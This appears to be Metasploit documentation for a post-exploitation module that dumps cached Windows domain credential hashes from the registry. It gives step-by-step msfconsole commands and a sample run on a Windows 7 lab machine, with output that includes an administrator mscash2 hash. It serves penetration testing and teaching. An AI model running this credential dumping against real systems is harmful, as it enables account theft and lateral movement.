## Vulnerable Application

This module uses the registry to extract the stored domain hashes that have been cached as a result of a GPO setting. The default setting on Windows is to store the last ten successful logins.

## Verification Steps
  1. Start msfconsole
  2. Get meterpreter session
  3. Do: ```use post/windows/gather/cachedump```
  4. Do: ```set SESSION <session id>```
  6. Do: ```run```

## Options

  **SESSION**

  The session to run this module on.


## Scenarios

### Windows 7 (6.1 Build 7601, Service Pack 1).

  ```
  [*] Meterpreter session 1 opened (192.168.1.3:4444 -> 192.168.1.6:49184) at 2019-12-11 12:51:59 -0700

  msf > use post/windows/gather/cachedump
  msf post(windows/gather/cachedump) > set SESSION 1
    SESSION => 1
  msf post(windows/gather/cachedump) > run

    [*] Executing module against TEST-PC
    [*] Cached Credentials Setting: 10 - (Max is 50 and 0 disables, and 10 is default)
    [*] Obtaining boot key...
    [*] Obtaining Lsa key...
    [*] Vista or above system
    [*] Obtaining NL$KM...
    [*] Dumping cached credentials...
    [*] Hash are in MSCACHE_VISTA format. (mscash2)
    [+] MSCACHE v2 saved in: /root/.msf4/loot/20191211134214_default_192.168.1.6_mscache2.creds_626325.txt
    [*] John the Ripper format:
    # mscash2
    administrator:$DCC2$10240#administrator#89f253291a4b53a41c94057d644cbd1d::

    [*] Post module execution completed
  ```
